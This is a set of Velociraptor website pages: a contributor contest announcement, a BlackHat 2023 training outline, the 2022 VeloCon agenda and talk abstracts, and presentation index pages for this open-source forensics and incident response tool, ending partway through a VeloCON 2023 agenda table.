Some specific ideas:

1. **Impactful process/integration** - How does your contribution help in
   making real world DFIR work smoother and more efficient? Describe
   how you used to do this task previously and how it has been
   improved as a result of your contribution.

2. **Detection artifacts** - Each submission may contain several VQL
   artifacts - how do the artifacts improve Velociraptor's detection
   capability? Can you include metrics of how effective they are
   compared to previous technology?

3. **Monitoring artifacts/plugins** - This category includes real time
   monitoring queries to enhance Velociraptor's endpoint monitoring
   capability.

## Deadline

Deadline for submission is Midnight 20th September 2021 anywhere on earth. The email address for submission is: **contest@velociraptor.app**

## Winner Announcements

Winners will be announced at the [SANS Threat Hunting Summit Thurs Oct 7 - Fri, Oct 8, 2021](https://www.sans.org/cyber-security-training-events/threat-hunting-and-incident-response-summit-2021)

## Prizes

The competition carries 3 prize levels, first prize is **$5000 USD**, Second
prize **$3000 USD** and third prize at **$2000 USD**. All winners will also
receive a Velociraptor contributor coin, commemorating them as a
valued member of the Velociraptor community.

Winning submissions will also be published on the Velociraptor web
site.

Significant contributions will receive some cool Velociraptor
merchandise.

## Requirements

The submitted content should work with the latest Velociraptor
release. If your content requires new functionality, work with us to
implement it in time for the submission deadline.

A submission must include new functionality in the form of VQL
artifacts, Velociraptor plugins or new Velociraptor
code/integration. Submissions should also include a short document or
video explaining the contribution and its value to the wider DFIR
community.


## Non-eligibility

The Rapid 7 Velociraptor team can not submit but will be available to
consult and assist other entrants. You may draw on any member of the
community for help in creating the contribution (e.g. ask for help on
Discord, file GitHub issues or feature requests etc), but all
contributions should be substantially your own.

We have a lot of industry leaders on the judging panel. Members of the
judging panel may enter a submission but they may not vote on their
own submission or any submission for which they declare a conflict of
interest.

## Submission Process

The submission should include the code, description and a write up of
functionality, background and a signed contribution license agreement
([CLA](https://github.com/Velocidex/velociraptor/blob/master/CLA.md)).

In particular we want to know how the submission improves a capability
or workflow in the real world. We value practical and impactful
changes over technologically complex, but rarely used additions. The
submission writeup should be sufficiently detailed for the judging
panel to properly assess the novelty and usefulness of the submission.

All submission code will be released under the same license as
Velociraptor (i.e. [AGPL](https://github.com/Velocidex/velociraptor/blob/master/LICENSE)) and may be included in future
releases. Contributors should also sign the Velociraptor CLA prior to
submitting a contribution (Please click [here to sign](https://cla-assistant.io/Velocidex/velociraptor) and indicate your Github username in the submission).

## Selection criteria

The Velociraptor competition judges are selected from the wider
industry and past community contributions. The judges will
independently rank contributions and will vote based on the following
broad criteria.

* Usefulness
* Creativity
* Effort / Difficulty
* Completeness of solution
* Clarity of documentation

Selected works may also be asked to present their work at future
conferences with the Velociraptor team and featured on the
Velociraptor blog.

---END OF FILE---

======
FILE: /content/announcements/2023-trainings/_index.md
======
---
menutitle: "Trainings"
title: "Upcoming Training Events"
description: |
    The Velociraptor team will be at BlackHat this year!

weight: 20
no_edit: true
noTitle: true
hidden: true

---

# Digging Deeper With Velociraptor
## Mike Cohen, Digital Paleontologist, Rapid7 Inc. | August 5-8

We are really looking forward to spend the week with other
Velociraptor fans geeking out on DFIR and Velociraptor!

This year we will be presenting an extensive, 4 day long, Velociraptor
training course at
[BlackHat 2023](https://www.blackhat.com/us-23/training/schedule/#digging-deeper-with-velociraptor-30129)!


## Detailed Outline

The following detailed course outline gives you an idea of the topics
covered in the training. Of course this is a live course and we love
discussing all things Velociraptor, so please bring your own questions
and ideas along as well!

### **Module 1**: Deployment

   * Deploying Servers
      * What is Velociraptor?
      * Typical deployments and overview
      * Cloud deployment options
      * Setting up Dynamic DNS
      * Configuring Google OAuth2
      * Exercise: Configure and deploy a new Server with Google and
        Lets Encrypt
      * Using multiple OAuth providers - Azure + Google
      * Deploying with browser client certificates
      * Exercise: Create a Multi-Frontend deployments
      * Exercise: Customize the dashboard
      * Server Lockdown Mode: Additional security.
   * Multi-Tenancy deployments
      * Supporting multiple Orgs on the same server.
      * Exercise: Create a new Org
      * User roles, ACLs and Orgs
      * Exercise: Add additional Users to new Org
      * Exercise: Prepare MSI deployment for different orgs
      * Auditing User Actions.
   * Deploying Clients
      * Windows - Creating MSI packages
      * Exercise: Domain Deployment
   * GUI Tour
      * The Dashboard
      * User preferences: Themes, Languages, Timezones
      * Interactively investigate clients
      * Searching for clients
      * Running shell commands
      * The Virtual Filesystem
      * Previewing files in the GUI

### **Module 2**: VQL Fundamentals

  * The Velociraptor Query Language
      * Why a query language?
      * The Notebook - an interactive document
      * What is VQL syntax?
      * Life of a query - understanding data flow
      * Explaining a VQL Query
      * Exercise: List running processes
      * Exercise: Lazy Evaluation
      * What is a scope?
      * The foreach() plugin
      * Exercise: Hash all the files!
      * Exercise: Hash faster!
      * LET Expressions
      * Materialized LET Expressions
      * Local VQL Functions
      * Protocols and VQL operators
      * Exercise: Detect WMI launched shell
      * Exercise: Enrich netstat with binary info
  * VQL Artifacts: VQL Modules
      * What are Velociraptor Artifacts?
      * The Artifact Exchange
      * Exercise: Selectively Import artifacts
      * Main parts of an artifact
      * Parameter types
      * Exercise: Create an artifact - WMI shell
      * Collecting artifact
      * Artifact Writing tips
      * VQL and times - formatting and parsing times
      * Exercise: Identify recently active accounts
      * VQL Control structures
      * Aggregate Functions and GROUP BY Stacking
  * Event Queries and asynchronous VQL
      * What are Event Queries
      * Client monitoring with VQL

### **Module 3**: Filesystem Forensics

  * Searching for files - glob()
    * Exercise: Search for executables
    * Filesystem accessors
    * The registry accessor
    * Exercise: RunOnce detection
    * Raw Registry Parsing
    * Paths in Velociraptor
    * The data accessor
    * Search bulk data for patterns: yara
    * Exercise: drive by download using YARA
    * Yara best practice
    * Uploading files
    * Exercise: Collect all executables in user's home directory
  * NTFS Forensics
    * NTFS Overview
    * NTFS Analysis in Velociraptor
    * Finding suspicious files
    * Exercise: Use NTFS analysis to detect attacker behavior
    * The USN Journal
    * Alternate Data Streams
    * Volume Shadow Copies (VSS)
    * The ntfs accessor and VSS
    * Exercise: Find all VSS copies of the same event log
    * Carving the USN Journal
  * More on Accessors
    * The OSPath object
    * Exercise: Parsing a string into OSPath
    * Life of a Path: How are paths handled within VQL
    * Exercise: OSPath operations
    * The ZIP accessor and nested paths
    * Exercise: Search a word document for a keyword
    * The Process Accessor: Accessing process memory
    * Exercise: Write an artifact that uploads process memory
    * The sparse accessor
    * Exercise: Upload only first 10k of each file.
    * The smb accessor
    * Exercise: Configuring an SMB share
  * Parsing: Processing and analysing evidence on the endpoint
    * Built in parsers: SQLite
    * Parsing with Regular Expressions
    * Exercise: Parse MPLogs
    * The binary parser - parsing binary data
    * Exercise: Parsing SSH private keys
    * Exercise: Parsing root certificates in the registry
  * Timelines
    * What is a timeline?
    * Exercise: Create a timeline for the NTFS investigation
  * MSBuild based attacks
    * The Microsoft Build Engine
    * MSBuild: Cobalt Strike teamserver
    * Detection ideas: Disk template files
    * Exercise: Detect a typical MSBuild attack
    * Exercise: Prefetch detection
    * Exercise: Memory only detection
    * Exercise: Search for beacon in memory
    * Exercise: Extract configuration data from memory

### **Module 4**: Event Logs
  * The Windows Event Logs
    * Parsing EVTX log files
    * Event Messages - where are they?
    * Deriving event messages
    * What could go wrong - copying event logs from the system.
    * Disabling event logs
    * Exercise: Detecting disabled event logs
    * Using Sigma Rules to search event logs
    * The EVTX Hunter
  * Syslog log: Linux/Unix logs
    * Line based logging
    * Applying Grok for parsing syslogs
    * Parsing SSH login events
    * Exercise: Write a structured artifact for extracting SSH login events
    * Carving SSH auth logs

### **Module 5**: Offline Collection and Triage
   * Interactive triage collections
     * Collecting Files: Windows.KapeFiles.Targets
     * Resource control
   * Offline Collections
     * Why an offline collector?
     * Creating an Offline Collector
     * Exercise: Collect triage data and upload to a cloud bucket
     * Protecting the collection file: Encryption
     * Exercise: Take a memory image with winpmem
     * Preparing an SMB share to receive offline collections
     * Importing collections into the GUI
     * Local collection considerations

### **Module 6**: Volatile artifacts and Memory Analysis
   * The Process Tracker
     * Tracking process executions on the endpoint
     * Exercise: Emulate an attack
     * The Process Tree and call chain
   * Event Tracing For Windows (ETW)
     * ETW Providers
     * Exercise: Monitor DNS Queries
   * Memory and Process Analysis
     * Mutants
     * Handles
     * Process Information
     * The process Environment Block
     * Process Memory - Mapped Memory
     * The VAD Plugin
     * Exercise: Determine functionality by examining the VAD
     * Process Injection
     * Process Memory Scanning
     * Exercise: Memory carving: Zip Files
     * Physical Memory Acquisition

### **Module 7**: Hunting
   * Hunting at scale
     * Typical hunting workflow
     * Mitre Att&ck framework
     * Atomic Red team
     * Exercise: Image File Execution Options
     * Hunting: Mass collections
     * Exercise: Baseline Event Logs
     * The pool client
     * Exercise: Stacking reveal results that stand out
     * Optimizing filtering and post processing.

### **Module 8**: Event queries for monitoring
  * Using Event Queries for detection.
     * Lateral movement using WMI
     * Exercise: Watch for new service creation
  * Integration with external systems
     * Interfacing with Elastic/Kibana
     * Uploading collections to Elastic
     * Integration with Slack/Discord
     * Exercise: Forwarding alerts to Discord

### **Module 9**: Server Automation and the API
  * Extending VQL With Powershell
     * Exercise: PowerShell based pslist
  * Using External Tools
     * Velociraptor Third Party Tools
     * Exercise: Detect malicious scheduled task with autoruns
     * Exercise - Package Sysinternal DU
     * Serving tools from an SMB server
  * Server Artifacts
     * Exercise: Write artifact for Client version distribution
     * Exercise: label clients
     * Exercise: Write a server event query to automatically import
            new offline collections uploaded to S3 or SMB share.
  * The Velociraptor API
     * Creating an API certificate
     * Managing ACLs for an API key
     * Exposing the API
     * Using the API from Python
     * Exercise: Launch collection on client with the API
     * Exercise: Automatically Decode Powershell encoded cmdline
     * Alerting and escalation.

### **Module 10**: Friendly game of Capture the Flag
  * Given a threat report, your team will develop a set of artifacts
    that detect as many steps in the kill chain as possible. Deploy
    those artifacts in the Velociraptor environment.
  * The Winners are the team that automatically detects and remediates
    the most attacker actions.

## Book now

Reserve your spot on this course by clicking here
https://www.blackhat.com/us-23/training/schedule/#digging-deeper-with-velociraptor-30129

---END OF FILE---

======
FILE: /content/announcements/2022-velocon/_index.md
======
---
menutitle: "2022 VeloCon"
title: "The 2022 Velociraptor Conference - Digging together..."
description: |
    Join us in our annual Velociraptor conference to discuss and share your experiences with Velociraptor!

weight: 10
no_edit: true
hidden: true
noTitle: true
---

<img style="width: 100%" src="velocon.jpg">

## The 2022 Velociraptor Conference - Digging together...

Thank you for joining us for the day-long virtual summit as we DIG
DEEPER TOGETHER!

[The full conference is now available!]({{< ref "/presentations/2022_velocon/" >}})

## Agenda at a glance

<table cellspacing="0" border="0">
    <colgroup width="115"></colgroup>
    <colgroup width="342"></colgroup>
    <colgroup width="318"></colgroup>
    <tr>
        <td style="border-top: 1px solid #000000; border-left: 1px solid #000000" height="20" align="left" valign=bottom bgcolor="#000000"><b><font size=3 color="#FFFFFF">Time Slot (ET)</font></b></td>
        <td style="border-top: 1px solid #000000" align="left" valign=bottom bgcolor="#000000"><b><font size=3 color="#FFFFFF">Speaker</font></b></td>
        <td style="border-top: 1px solid #000000; border-right: 1px solid #000000" align="left" valign=bottom bgcolor="#000000"><b><font size=3 color="#FFFFFF">Topic</font></b></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">9-9:05</font></td>
        <td style="border-right: 1px solid #000000" colspan=2 align="center" valign=bottom><b><font size=3 color="#000000">INTRO</font></b></td>
        </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">9-9:30 am</font></td>
        <td align="left" valign=bottom><font size=3 color="#000000">Mike Cohen <br>Digital Paleontologist, Velociraptor/Rapid7</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">Year in Review/Future Roadmap</font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">9:30-10 am</font></td>
        <td align="left" valign=bottom><font size=3 color="#000000">Matt Green <br>Principal Software Engineer, Velociraptor/Rapid7</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
            <a href="#notebook-and-vql---data-munging-your-way-to-victory">
                Notebook &amp; VQL - Data munging your way to victory!
            </a></font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">10-10:30 am</font></td>
        <td align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">Wes Lambert <br>Principal Engineer, Security Onion Solutions, LLC</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
            <a href="#velocistack-swiftly-configuring-a-streamlined-investigation-environment">
                Velocistack: Swiftly Configuring a Streamlined Investigation Environment
            </a>
        </font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">10:30-11 am</font></td>
        <td style="border-right: 1px solid #000000" colspan=2 align="center" valign=bottom><b><font size=3 color="#000000">BREAK</font></b></td>
        </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">11-11:45 am</font></td>
        <td align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">Christian Hammerschmidt, PhD <br>Head of Engineering/ML, APTA Technologies</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
            <a href="#machine-learning-for-dfir-with-velociraptor-from-setting-expectations-to-a-case-study">
                Machine Learning for DFIR with Velociraptor: From Setting Expectations to a Case Study
            <a>
        </font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">11:45-12:30 pm</font></td>
        <td align="left" valign=bottom><font size=3 color="#000000">Dan Baker <br>Threat Response Team Lead, Motorola Solutions</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
            <a href="#when-dinosaurs-ruled-the-blue-team-retrieving-triage-images-with-edr">
                When Dinosaurs Ruled the Blue Team: Retrieving triage images with EDR
            </a>
        </font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">12:30-1:30 pm</font></td>
        <td style="border-right: 1px solid #000000" colspan=2 align="center" valign=bottom bgcolor="#EFEFEF"><b><font size=3 color="#000000">LUNCH</font></b></td>
        </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">1:30-2 pm </font></td>
        <td align="left" valign=bottom><font size=3 color="#000000">Wes Lambert <br>Principal Engineer, Security Onion Solutions, LLC</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
            <a href="#using-dinosoarlab-to-uncover-adversary-actions-and-orchestrate-rapid-response">
                Using DinoSOARLab to Uncover Adversary Actions and Orchestrate Rapid Response
            </a>
        </font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">2-2:30 pm</font></td>
        <td align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">Mike Cohen <br>Digital Paleontologist, Velociraptor/Rapid7</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">
            <a href="#cloud-native-velociraptor">
                Cloud Native Velociraptor
            </a>
        </font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">2:30-3:15 pm</font></td>
        <td align="left" valign=bottom><font size=3 color="#000000">Luke Fardell <br>Director of DFIR, Control Risks</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
            <a href="#velociraptor-and-law-enforcement">
                Velociraptor and Law Enforcement
            </a>
        </font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">3:15-3:45 pm</font></td>
        <td style="border-right: 1px solid #000000" colspan=2 align="center" valign=bottom bgcolor="#EFEFEF"><b><font size=3 color="#000000">BREAK</font></b></td>
        </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">3:45-4:30</font></td>
        <td align="left" valign=bottom><font size=3 color="#000000">Mike Pilkington <br>SANS Institute</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom><font size=3 color="#000000">
            <a href="#mac-response--the-good-the-bad-and-the-ugly">
                Mac Response – The Good, the Bad, and the Ugly
            </a>
            </font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">4:30-5 pm</font></td>
        <td align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">Wes Lambert <br>Principal Engineer, Security Onion Solutions, LLC</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">
            <a href="#purple-teaming-with-artifacts">
                Purple Teaming with ARTifacts
            </a>
        </font></td>
    </tr>
    <tr>
        <td style="border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom><font size=3 color="#000000">5-5:15 pm</font></td>
        <td align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">Paulo Pereira, PhD<br>Forensics at Digits3c</font></td>
        <td style="border-right: 1px solid #000000" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">
            <a href="#ransomware-investigation-using-velociraptor">Ransomware Investigation Using Velociraptor</a></font></td>
    </tr>
    <tr>
        <td style="border-bottom: 1px solid #000000; border-left: 1px solid #000000; padding-left: 10px" height="20" align="left" valign=bottom bgcolor="#EFEFEF"><font size=3 color="#000000">5:15-5:20 pm</font></td>
        <td style="border-bottom: 1px solid #000000; border-right: 1px solid #000000" colspan=2 align="center" valign=bottom bgcolor="#EFEFEF"><b><font size=3 color="#000000">WRAP</font></b></td>
        </tr>
</table>


## Detailed Program


### Ransomware Investigation Using Velociraptor.
By **Paulo Pereira, PhD** - Digits3c

The objective of this work is to present the investigation process for
the identification of malware activities in memory analysis. The real
scenario is formed by the ransomware attack on a corporate server
(Windows 2008 R2) from which the memory file was obtained moments
after the attack was discovered. The attackers exploited this server
to target the company&#39;s services, which were down for two weeks.
Velociraptor was used to identify the processes affected by the
artifact. Based on a bibliographic, descriptive, exploratory and pure
methodology, a comparison base (baselines) was created to identify the
processes normally initiated by this version of the server. The
results found were the process used by the ransomware, the execution
of hidden processes in the system and the files that was created by
the malicious program.  The creation of a comparative base combined
with the listing of processes and a rule to search for data patterns
contributed to the identification of processes that are foreign to the
attacked server, since this strategy proved to be efficient to
identify the presence of ransomware in some server processes. that the
simple listing of processes failed to show.  Keywords: Velociraptor,
Process, Malware, Ransomware.


### Notebook and VQL - data munging your way to victory!

By **Matt Green**

Velociraptor notebook is a feature that supercharges analysis and
speeds up many components of incident response. New users are often
intimidated by advanced VQL and don't know where to start. This talk
aims to shed some light on data manipulation in VQL and provide some
practical examples that can be taken away for better artifacts and
analysis.


### Velocistack: Swiftly Configuring a Streamlined Investigation Environment
By **Wes Lambert** - Principal Engineer, Security Onion Solutions

In this presentation, we’ll discuss Velocistack, a Docker-based, free
and open investigation stack centered around Velociraptor. The project
makes it super easy to spin up a local Velociraptor server with Docker
Compose, tied together with other services that complement
investigation and can benefit analysts or incident responders.

Want to post-process collection or hunt results outside of
Velociraptor?

Maybe it would be beneficial to be able to quickly and easily search
through the data and correlate with other data sets?

How about the ability to build detailed graphs and visualizations
around Velociraptor artifacts or metrics?

Would you like to be able to perform data decoding and transformation
using a variety of recipes, baking your data to perfection?

Want the ability to easily track investigations through native case
management, attaching evidence to cases, associate evidence/IOCs to
assets, and build greater context around collected data?

Want to better understand how to leverage Velociraptor’s “transparent
proxy” feature to host your own additional services behind it?

If you answered yes to any of these questions, then Velocistack may be
for you! To learn more about Velocistack, attend this presentation!

### Machine Learning for DFIR with Velociraptor: From Setting Expectations to a Case Study
By **Christian Hammerschmidt, PhD** - Head of Engineering/ML, APTA Technologies

Machine learning (ML) or artificial intelligence (AI) often comes with
great promise and large marketing budgets for cybersecurity,
especially in monitoring (such as EDR/XDR solutions). Post-breach, it
often turns out that the actual performance falls short of its
promises.

In this talk, we'll briefly look at ML for DFIR: What tasks can ML
solve, generally speaking? What requirements do we have for a useful
ML system in cybersecurity/DFIR contexts, such as reliability,
robustness to attackers, and explainability? What makes ML difficult
to apply in cybersecurity, e.g. when thinking about false alerts or
attackers attempting to circumvent automated systems?

After discussing the basics, we look at ML for velociraptor:

1. How can we process forensic data collected with VQL using machine
   learning (with a typical Python/Jupyter/scikit-learn/PyTorch
   stack)?

2. And how can we build artifacts that run ML directly on each
   endpoint, avoiding central data collection?

The talk concludes with a case study, showing how we significantly
reduced time to analyze EVTX files in incident response cases, saving
thousands of USD in costs and reducing time to resolution.

Bio: Chris Hammerschmidt did his PhD research on machine learning
methods for reverse engineering software systems. Now, he's heading
APTA Technologies, a start-up building machine learning tools to
understand software behavior .

Affiliation: APTA Technologies, https://apta.tech

### When Dinosaurs Ruled the Blue Team: Retrieving triage images with EDR
By **Dan Banker**
Threat Response Team Lead at Motorola Solutions

With the recent rise in users working remotely, many security-related
processes have had to adapt. One of these is capturing a forensic
image for analysis. Acquiring a bit-for-bit copy of a 500 MB+ disk
over the network can be impractical, and obtaining the physical drive
may introduce unacceptable delays. I will outline a process for using
EDR to deploy the Velociraptor standalone executable and capture a
triage image under 500MB in size. The executable can be deployed and
the image retrieved in under 30 minutes, and will hand your team the
most important forensic artifacts to start the investigation. I'll
also cover using Winpmem in a similar process to retrieve memory, and
an alternate triage image process for Linux machines.

### Using DinoSOARLab to Uncover Adversary Actions and Orchestrate Rapid Response
By **Wes Lambert** - Principal Engineer, Security Onion Solutions

Have you ever worked in a DinoSOAR lab? If not, now’s your chance!

In this presentation, we'll discuss integration of Velociraptor with
Security Onion, a free and open platform for enterprise security
monitoring, intrusion detection, threat hunting, and log management.

Along with other tools, the integration will assist in facilitating
contextual enrichment, orchestration, and automation by tying together
host, network, and other telemetry in an effort to paint a more
accurate picture of adversary activity in a computer network.

While Velociraptor provides excellent insight and the ability to
gather and process forensic evidence quickly and easily, when paired
with passive network analysis from tools like Suricata (NIDS alerts),
Zeek (connection/protocol-specific/transaction logs), Google
Stenographer (full packet capture), we can glean important
associations that otherwise might not have been noticed, more
effectively scope an incident, and potentially come to a conclusion
much more quickly during an investigation. We can pore over, sort, and
create visualizations to correlate activity and build relationships
between artifact/host data from Velociraptor and network data provided
by Security Onion.

To track our investigations, we can create cases, adding observables
and enriching the data made available by Velociraptor and other tools,
or kick off additional hunts as needed. In this way, we’re going
full-circle from Velociraptor to Security Onion and so on, with each
complementing the other to provide additional context and
capability. Attendees will walk away with an understanding of not just
how they can benefit from integration of Velociraptor with Security
Onion, but with other stacks and technologies as well.

### Cloud Native Velociraptor
By **Mike Cohen** - Digital Paleontologist

Velociraptor is fast becoming the default choice for a DFIR and
continuous monitoring solution. While Velociraptor was originally
designed for ease of deployment, targeting smaller organizations, as
the tool matures and gains more enterprise ready features there is a
growing need to cater for very large cloud native deployments (in the
millions of endpoints).

This talk introduces a new project based on Velociraptor called "Cloud
Raptor". This experimental new project is an attempt to implement
Velociraptor using cloud native technologies, namely S3 and Opensearch
as well as using AWS Lambda functions. The talk will cover some of the
architectural aspects of the Velociraptor code base that make it
possible to reimplement core functionality easily.

The new architecture makes some Velociraptor features easier to
implement, while other features are more difficult to implement. This
talk will discuss the pros and cons of this approach since it is
currently not a complete feature for feature
implementation. Nevertheless, having an additional, highly scalable
version of Velociraptor that can be used in some situations is very
useful to the Velociraptor ecosystem.


### Velociraptor and Law enforcement
By **Luke Fardell** - Director of DFIR, Control Risks

Dealing with an incident which results in the prosecution of a threat
actor when all the data was gathered using Velociraptor. The talk
focuses on the challenges faced when dealing with the courts and the
police when stepping away from the normal full disk imagery processes
the courts are used to.

I used Velociraptor during a network breach for a client, the attack
resulted in all sys admin accounts being removed from the AD. The
threat actor then disabled the buildings access controls and
specifically the server room door controls. The threat actor then
began to destroy the datacentre by mass deleting files and wiping
systems.  The attack was thwarted mid-way through by the IT staff
using an emergency over-ride to bypass the door controls and used a
metal bar to prise open the door and pull the network cables out. This
sounds like something from a movie but it genuinely happened.

The analysis using velociraptor uncovered an account that was created
3 months prior to the attack in the AD that was used to access the
VPN. Cross checking with HR records a former sys admin was fired on
the same day. The threat actor also failed to log into some systems
and ended up re-enabling the former sys admins account to access the
door controls. During analysis we extracted the AD and obtained the
password hash for the new accounts created, the passwords we relevant
to the former employee. The firewall analysis identified a home
broadband IP address was used and also the IP address of a fishing
club frequented by the former employee.  The case is currently with
the UK courts and police. It would be great to share my experiences
dealing with law enforcement and explaining the deployment of
velociraptor and how it collects data. Specifically having to explain
the lack of a full traditional forensic image which was not possible
in this situation. The client rebuilt the network in haste and we had
to rely on the data we collected via velociraptor.  The case is still
on going and I am giving evidence and statements currently. My main
point of contention is that the lawyers are used to only dealing with
full disk images (e01 with hashes etc.) This case involved thousands
of endpoints during the deployment and the systems we gathered data
from using velociraptor had to be rebuilt over the weekend. Changing
the lawyers mindset was difficult but the process was documented using
the server side telemetry which showed our working processes and we
were able to document the analysis effectively. Also the hashing of
individual files on upload helped massively and gave the law
enforcement comfort.



### Mac Response – The Good, the Bad, and the Ugly
By **Mike Pilkington**

Mac adoption is on the rise. Gartner reported 8.5% market share for
macOS in the enterprise in 2021, and the rate of adoption continues to
rise. With Macs becoming more common across more organizations, it's
important for security teams to have the ability to respond
effectively. Velociraptor offers an excellent opportunity to do that!
However, deploying and using security tooling like Velociraptor comes
with a unique set of challenges on Macs. In particular, features such
as System Integrity Protection (SIP) and Transparency, Consent, and
Control (TCC) make rapid response difficult if responders have not
planned ahead. In this talk, we’ll cover how to prepare to clear these
hurdles so that you have solid visibility when responding to Mac hosts
in your network. We’ll also look at useful areas for analyzing
potential intrusions against Macs, and how Velociraptor can speed up
the triage process at scale.


### Purple Teaming with ARTifacts
By **Wes Lambert** - Principal Engineer, Security Onion Solutions

Do you currently engage in purple teaming, or would like to get
started? Would you like a way to make deployment of Atomic Red Team
tests faster, easier, and more streamlined? How about determining
detection efficacy?

All of this and more can be made possible by leveraging Atomic Red
Team tests within Velociraptor artifacts. No kidding, we can implement
these tests within an artifact, then have them run on an endpoint,
without user intervention. Furthermore, we can leverage detection
rules from within Velociraptor to catch the simulated attack activity
and gauge the effectiveness of our detections.

Attendees will walk away from this presentation with several examples
of how they immediately leverage Atomic Red Team tests and catch
execution of those tests through Velociraptor to evaluate their
detection capability and improve the security of their enterprise.

---END OF FILE---

======
FILE: /content/presentations/_index.md
======
---
menutitle: "Presentations"
title: "Presentations"
weight: 120
no_edit: true
pre: <i class="fas fa-chalkboard-teacher"></i>
---

The following are various presentations and events that featured
Velociraptor in some way.

You can see these presentations and more on our [presentations site](https://present.velocidex.com/)

{{% children %}}

---END OF FILE---

======
FILE: /content/presentations/2024_auscert/_index.md
======
---
title: Auscert Workshop 2024
menutitle: Auscert 2024
weight: 120
---

This workshop took place on the 22nd May 2024.

This is an introductory workshop to Velociraptor covering basic GUI
navigation, and using high level artifacts such as `SQLiteHunter`,
`EvtxHunter`, `Registery Hunter` and `Sigma` to quickly triage an
endpoint in an incident.

You can follow along by watching the below videos and reading the
slides below.

## Slides

<iframe src="https://present.velocidex.com/presentations/2024-auscert-workshop/index.html" frameborder="0" width="980px" height="600px" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>

[Full Screen](https://present.velocidex.com/presentations/2024-auscert-workshop/index.html)

## Video Part 1

<iframe width="560" height="315" src="https://www.youtube.com/embed/ie6-859ERv4?si=5SIszrD2-Cqn54Z-" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

## Video Part 2

<iframe width="560" height="315" src="https://www.youtube.com/embed/vB_rg0N69CY?si=kQIz3dd9imdp_SyP" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---END OF FILE---

======
FILE: /content/presentations/2023_velocon/_index.md
======
---
menutitle: VeloCON 2023
title: VeloCON 2023
weight: 100


---

<img style="width: 100%" src="velocon_banner_2023.jpg">

On September 13th 2023, we held the 2nd annual VeloCON virtual summit.
VeloCON is a 1 day event focused on the Velociraptor community. It's
a place to share experiences in using and developing Velociraptor to
address the needs of the wider DFIR community and an opportunity to take
a look ahead at the future of our platform.

VeloCON ended with Mike Cohen VeloCON with a review of the last twelve months
for Velociraptor, and some insight into the next twelve. 

<iframe width="1092" height="614" src="https://www.youtube.com/embed/0trXidVpuQs" title="VeloCon 2023: Year In Review/Future Roadmap" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

YouTube links to the sessions can be found below. 




## Agenda at a glance


<table cellspacing="0" border="0">
  <colgroup width="115"></colgroup>
  <colgroup width="342"></colgroup>
  <colgroup width="318"></colgroup>
  <tr>
    <td style="border-top: 1px solid #000000; border-left: 1px solid #000000" height="20" align="left" valign=bottom bgcolor="#000000"><b><font size=3 color="#FFFFFF">Time Slot (ET)</font></b></td>
